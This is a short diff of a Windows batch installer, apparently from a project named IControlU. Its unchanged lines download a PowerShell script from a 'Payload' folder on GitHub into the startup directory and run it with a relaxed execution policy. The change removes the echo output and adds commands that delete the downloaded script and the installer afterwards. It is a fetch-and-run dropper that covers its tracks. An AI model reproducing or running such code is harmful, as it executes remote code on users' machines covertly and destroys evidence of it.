@@ -11,6 +11,11 @@ cd /d "%StartupDirectory%"
 powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d1e7e2f8d26435e8781df7863bb169733e491b8b/Payload/DiscordPowershellDiscovery.ps1?raw=true' -OutFile 'Discovery.ps1'"
 
 @REM Run the PowerShell discovery
-@echo on 
-@echo %CD%
 powershell -ExecutionPolicy RemoteSigned -File "Discovery.ps1"
+
+@REM Delete the discovery file
+del "Discovery.ps1"
+
+@REM Delete the original installer
+cd /d %CurrentDirectory%
+del "Installer.cmd"
